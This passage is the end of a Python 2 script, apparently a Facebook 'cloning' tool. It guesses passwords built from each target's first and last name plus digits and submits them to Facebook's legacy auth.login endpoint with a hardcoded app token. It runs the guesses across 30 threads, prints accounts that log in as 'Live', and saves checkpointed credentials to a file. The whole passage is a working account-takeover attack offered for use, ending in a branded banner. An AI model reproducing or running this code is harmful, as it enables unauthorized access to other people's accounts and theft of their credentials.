														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name']+b['last_name']+'1235'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mLive\x1b[1;97m-\x1b[1;92m▣\x1b[1;97m-' + user + '-\x1b[1;92m▣\x1b[1;97m-' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91m[Rana.cp]\x1b[1;97m-\x1b[1;91m▣\x1b[1;97m-' + user + '-\x1b[1;91m▣\x1b[1;97m-' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mNadeem\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana-Nadeem--•◈•---»" #Dev:RAJPUT BRAND
	print '\033[1;95mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
        print '\033[1;95mNext Type (python2 NADEEM0003.py) Next login facebook Start Cloning\033[1;97m....'
	print"\033[1;92mTotal Live/\x1b[1;91mError \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝
Don't Worry Your Error ID Will Be Open After 7 Days 

•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;94m .....RAJPUT BRAND....... \033[1;97m :
•\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;94m RANA NADEEM RAJPUT"""
	
	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
	login()	
          
if __name__ == '__main__':
	login()
